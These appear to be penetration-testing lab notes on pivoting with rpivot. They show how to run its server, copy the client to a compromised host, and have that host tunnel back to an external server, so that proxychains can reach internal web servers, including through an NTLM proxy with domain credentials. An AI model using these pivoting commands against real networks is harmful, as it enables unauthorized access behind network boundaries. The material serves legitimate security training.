- [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. 
- Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.
![[Pasted image 20240801052005.png]]
#### Cloning rpivot
```shell
sudo git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```
#### server.py
```shell
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
#### Transfering rpivot to the Target
```shell
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### client.py
```shell
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
#### Confirming Connection is Established
```shell
New connection from host 10.129.202.64, source port 35226
```
#### Browsing to the Target Webserver using Proxychains
```shell
proxychains firefox-esr 172.16.5.135:80
```
#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```shell
python3 client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
